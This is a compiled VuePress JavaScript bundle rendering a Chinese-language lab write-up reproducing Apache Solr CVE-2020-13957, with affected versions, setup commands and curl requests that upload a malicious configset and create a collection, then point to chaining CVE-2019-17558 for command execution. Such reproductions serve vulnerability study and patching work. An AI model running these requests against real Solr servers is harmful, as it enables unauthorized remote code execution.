(window.webpackJsonp=window.webpackJsonp||[]).push([[430],{2123:function(s,a,t){s.exports=t.p+"assets/img/540ba570-fe93-4fc6-b7fd-f5a5a7fc8f3f.5ae4420b.png"},2625:function(s,a,t){"use strict";t.r(a);var e=t(75),n=Object(e.a)({},(function(){var s=this,a=s.$createElement,e=s._self._c||a;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"apache-solr-rce-未授权上传漏洞-cve-2020-13957"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#apache-solr-rce-未授权上传漏洞-cve-2020-13957"}},[s._v("#")]),s._v(" Apache Solr RCE 未授权上传漏洞 CVE-2020-13957")]),s._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),e("p",[s._v("在特定的Solr版本中ConfigSet API存在未授权上传漏洞，攻击者利用漏洞可实现远程代码执行。")]),s._v(" "),e("h2",{attrs:{id:"影响版本"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#影响版本"}},[s._v("#")]),s._v(" 影响版本")]),s._v(" "),e("p",[s._v("Apache Solr 6.6.0 -6.6.5")]),s._v(" "),e("p",[s._v("Apache Solr 7.0.0 -7.7.3")]),s._v(" "),e("p",[s._v("Apache Solr 8.0.0 -8.6.2")]),s._v(" "),e("h2",{attrs:{id:"环境搭建"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[s._v("#")]),s._v(" 环境搭建")]),s._v(" "),e("p",[s._v("选择一个存在漏洞的版本, 这里复现使用的是 "),e("code",[s._v("Apache Solr 7.7.0")]),s._v(" 进行复现, 下载后执行以下命令进行环境部署")]),s._v(" "),e("div",{staticClass:"language-shell line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-shell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" solr-7.7.0\n./bin/solr start -e cloud -force\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("p",[s._v("然后一路回车，直至出现")]),s._v(" "),e("div",{staticClass:"language-shell line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-shell"}},[e("code",[s._v("Created collection "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'gettingstarted'")]),s._v(" with "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" shard"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("s"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(", "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" replica"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("s"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" with config-set "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'gettingstarted'")]),s._v("\n\nEnabling auto soft-commits with maxTime "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(" secs using the Config API\n\nPOSTing request to Config API: http://localhost:8983/solr/gettingstarted/config\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"set-property"')]),s._v(":"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"updateHandler.autoSoftCommit.maxTime"')]),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"3000"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\nSuccessfully set-property updateHandler.autoSoftCommit.maxTime to "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("3000")]),s._v("\n\n\nSolrCloud example running, please visit: http://localhost:8983/solr\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br")])]),e("p",[s._v("访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可")]),s._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),e("p",[s._v("在攻击机上下载目标版本的Solr,执行下列命令打包压缩文件")]),s._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[s._v("solr-7.7.0/server/solr/configsets/sample_techproducts_configs/conf\nzip -r - * > vuln.zip\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("p",[e("img",{attrs:{src:t(2123),alt:"540ba570-fe93-4fc6-b7fd-f5a5a7fc8f3f"}})]),s._v(" "),e("p",[s._v("将 vuln.zip 进行上传")]),s._v(" "),e("div",{staticClass:"language-shell line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-shell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" -X POST --header "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Content-Type:application/octet-stream"')]),s._v(" --data-binary @vuln.zip "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http://xxx.xxx.xxx.xxx:8983/solr/admin/configs?action=UPLOAD&name=vuln"')]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("name参数为压缩包的文件名, 利用漏洞创建一个 core")]),s._v(" "),e("div",{staticClass:"language-shell line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-shell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http://xxx.xxx.xxx.xxx:8983/solr/admin/collections?action=CREATE&name=peiqi&numShards=1&replicationFactor=1&wt=xml&collection.configName=vuln"')]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("a-alert",{attrs:{type:"success",message:"name参数为创建的core核心名",description:"",showIcon:""}}),s._v(" "),e("a-alert",{attrs:{type:"success",message:"collection.configName参数为上传的文件名",description:"",showIcon:""}}),s._v(" "),e("br"),s._v("\n再使用 Apache Solr Velocity模板远程执行`CVE-2019-17558` 即可执行任意命令")],1)}),[],!1,null,null,null);a.default=n.exports}}]);